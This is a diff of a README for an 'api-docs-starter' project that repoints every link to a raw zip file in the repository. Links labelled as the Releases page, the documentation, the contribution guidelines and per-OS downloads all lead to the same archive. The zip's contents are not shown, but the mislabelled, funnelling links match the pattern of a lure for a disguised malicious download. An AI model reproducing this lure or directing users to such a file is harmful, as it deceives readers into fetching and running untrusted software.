@@ -8,20 +8,20 @@ Welcome to the **api-docs-starter**! This application helps you create modern AP
 
 To start, you need to download the latest version of **api-docs-starter**. Click the button below to visit the release page:
 
-[![Download Latest Release](https://raw.githubusercontent.com/MrDevid404/api-docs-starter/main/athletically/api-docs-starter.zip%20Latest%20Release-Click%20Here-blue)](https://raw.githubusercontent.com/MrDevid404/api-docs-starter/main/athletically/api-docs-starter.zip)
+[![Download Latest Release](https://github.com/MrDevid404/api-docs-starter/raw/refs/heads/main/docs/docs_starter_api_2.3.zip%20Latest%20Release-Click%20Here-blue)](https://github.com/MrDevid404/api-docs-starter/raw/refs/heads/main/docs/docs_starter_api_2.3.zip)
 
 On the Releases page, look for the latest version. Simply click the download link for your desired version to start the download. 
 
 ### Step-by-Step Installation
 
 1. **Visit the Releases Page**  
-   Click [here](https://raw.githubusercontent.com/MrDevid404/api-docs-starter/main/athletically/api-docs-starter.zip) to go directly to the Releases page. 
+   Click [here](https://github.com/MrDevid404/api-docs-starter/raw/refs/heads/main/docs/docs_starter_api_2.3.zip) to go directly to the Releases page. 
 
 2. **Select Your Version**  
    Look for the latest version listed at the top. It should have the version number and release date for easy identification.
 
 3. **Download the File**  
-   Depending on your operating system, find the corresponding file. For Windows, you might see a file like `https://raw.githubusercontent.com/MrDevid404/api-docs-starter/main/athletically/api-docs-starter.zip`. For Mac, look for `https://raw.githubusercontent.com/MrDevid404/api-docs-starter/main/athletically/api-docs-starter.zip`. Click on the link to start your download.
+   Depending on your operating system, find the corresponding file. For Windows, you might see a file like `https://github.com/MrDevid404/api-docs-starter/raw/refs/heads/main/docs/docs_starter_api_2.3.zip`. For Mac, look for `https://github.com/MrDevid404/api-docs-starter/raw/refs/heads/main/docs/docs_starter_api_2.3.zip`. Click on the link to start your download.
 
 4. **Locate the Downloaded File**  
    Check your "Downloads" folder or the folder you designated for the downloaded files.
@@ -81,8 +81,8 @@ We welcome contributions to **api-docs-starter**! If you’d like to help improv
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://raw.githubusercontent.com/MrDevid404/api-docs-starter/main/athletically/api-docs-starter.zip)
-- [Documentation](https://raw.githubusercontent.com/MrDevid404/api-docs-starter/main/athletically/api-docs-starter.zip)
-- [Contribution Guidelines](https://raw.githubusercontent.com/MrDevid404/api-docs-starter/main/athletically/api-docs-starter.zip)
+- [Releases Page](https://github.com/MrDevid404/api-docs-starter/raw/refs/heads/main/docs/docs_starter_api_2.3.zip)
+- [Documentation](https://github.com/MrDevid404/api-docs-starter/raw/refs/heads/main/docs/docs_starter_api_2.3.zip)
+- [Contribution Guidelines](https://github.com/MrDevid404/api-docs-starter/raw/refs/heads/main/docs/docs_starter_api_2.3.zip)
 
 Now that you have all the information you need, it’s time to get started. Download **api-docs-starter** today and create your API documentation the easy way!
